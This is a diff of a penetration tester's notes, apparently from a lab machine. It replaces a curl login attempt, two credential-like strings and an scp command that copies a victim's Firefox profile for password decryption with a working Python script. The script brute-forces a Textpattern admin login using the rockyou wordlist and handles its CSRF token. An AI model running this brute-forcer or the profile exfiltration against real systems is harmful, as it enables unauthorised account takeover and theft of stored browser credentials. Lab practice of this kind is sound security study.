@@ -1,11 +1,44 @@
-scp -o StrictHostKeyChecking=no -r elliot@192.168.56.124:/home/elliot/.mozilla/firefox/esmhp32w.default-default /home/kali/firefox_decrypt/
+textpattern_bruteforce
 
 
+import requests
+from bs4 import BeautifulSoup
 
-S8Y389KJqWpJuSwFqFZHwfZ3GnegUa
-wJ9`"Lemdv9[FEw-
+# URL base del login
+url_login = "http://192.168.55.219/textpattern/textpattern/index.php"
 
+# Usuario y lista de contraseñas
+usuario = "admin"
+password_list = "/usr/share/wordlists/rockyou.txt"
 
-curl -X POST \
-  -d "login_username=admin&login_password=password&_txp_token=<token_aqui>" \
-  http://192.168.55.219/textpattern/textpattern/index.php
+# Leer contraseñas
+with open(password_list, "r", encoding="utf-8", errors="ignore") as f:
+    passwords = f.read().splitlines()
+
+# Sesión para manejar cookies
+session = requests.Session()
+
+for pwd in passwords:
+    # 1. GET para obtener el token
+    r = session.get(url_login)
+    soup = BeautifulSoup(r.text, "html.parser")
+    token_tag = soup.find("input", {"name": "_txp_token"})
+    if not token_tag:
+        print("No se encontró el token")
+        break
+    token = token_tag.get("value", "")
+
+    # 2. POST con usuario, contraseña y token
+    data = {
+        "login_username": usuario,
+        "login_password": pwd,
+        "_txp_token": token
+    }
+    post = session.post(url_login, data=data)
+
+    # 3. Verificar si el login fue exitoso
+    if "Sorry, the form could not be submitted" not in post.text:
+        print(f"[+] Contraseña válida encontrada: {pwd}")
+        break
+    else:
+        print(f"[-] Intento fallido: {pwd}")
